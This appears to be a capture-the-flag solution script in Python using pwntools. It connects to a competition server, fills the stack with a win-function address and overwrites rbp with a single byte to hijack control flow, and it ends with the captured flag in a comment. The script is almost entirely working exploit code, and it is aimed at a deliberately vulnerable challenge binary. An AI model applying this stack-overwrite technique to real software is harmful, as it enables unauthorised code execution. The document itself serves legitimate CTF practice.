from pwn import *

elf = context.binary = ELF("chall")
# p = process()
p = remote("pwn.blitzhack.xyz" ,8088)


# fill stack with win func
p.send(35 * p64(elf.sym.win + 5))
p.send(35 * p64(elf.sym.win + 5))


# noitce stuff
    # gdb.attach(p,"b *main+104")


# ovewrite rbp and ret2win
p.send(b'a'.ljust(0x118 - 8,b"C") + p8(0))
p.interactive()

# Blitz{r3curs10n_1s_just_4n0th3r_w0rd_f0r_1t3r4t10n}